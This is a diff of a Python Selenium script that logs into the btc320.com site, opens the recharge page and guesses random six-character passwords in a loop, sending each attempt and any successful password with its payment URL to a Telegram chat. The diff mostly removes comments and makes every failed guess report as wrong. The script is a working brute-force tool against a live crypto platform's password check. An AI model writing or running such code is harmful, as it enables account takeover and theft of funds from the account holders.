@@ -13,36 +13,29 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# First password to try
-initial_password = "Btc@658"
+initial_password = "Btc658"
 
-# Random password generator
 def generate_password(length=6):
     chars = string.ascii_letters + string.digits
     return ''.join(random.choice(chars) for _ in range(length))
 
-# Send message to Telegram
 def send_log(message):
     try:
         bot.send_message(CHAT_ID, message)
     except Exception as e:
         print("Telegram Error:", e)
 
-# Selenium browser setup
 def start_driver():
     chrome_options = Options()
     chrome_options.add_argument("--headless")
     chrome_options.add_argument("--no-sandbox")
     chrome_options.add_argument("--disable-dev-shm-usage")
     chrome_options.binary_location = "/usr/bin/google-chrome"
-    driver = webdriver.Chrome(options=chrome_options)
-    return driver
+    return webdriver.Chrome(options=chrome_options)
 
-# Start bot logic
 def main():
     driver = start_driver()
     try:
-        # Step 1: LOGIN PAGE
         driver.get("https://www.btc320.com/pages/user/other/userLogin")
         time.sleep(5)
 
@@ -52,7 +45,6 @@ def main():
         time.sleep(6)
         send_log("✅ Logged in successfully.")
 
-        # Step 2: NAVIGATE TO RECHARGE PAGE
         driver.get("https://www.btc320.com/pages/user/recharge/userRecharge")
         time.sleep(6)
         driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view[5]/uni-view/uni-view/uni-input/div/input').send_keys("10")
@@ -67,22 +59,16 @@ def main():
                 driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[4]/uni-view/uni-view/uni-button').click()
                 time.sleep(5)
 
-                # Success check by URL pattern
                 current_url = driver.current_url
                 if "rechargePay?sn=" in current_url:
                     send_log(f"✅ Password correct: {pwd}\nURL: {current_url}")
-                    break
+                    break  # stop trying
 
-                # Wrong password check via XPath
-                try:
-                    error_msg = driver.find_element(By.XPATH, '//*[@id="u-a-t"]')
-                    if "incorrect" in error_msg.text:
-                        send_log(f"❌ Wrong password: {pwd}")
-                except NoSuchElementException:
-                    pass
+                # Send wrong password update anyway
+                send_log(f"❌ Wrong password: {pwd}")
 
             except Exception as e:
-                send_log(f"Error during password try: {e}")
+                send_log(f"⚠️ Error while testing password '{pwd}': {e}")
 
     except Exception as e:
         send_log(f"🔥 Bot crashed: {e}")
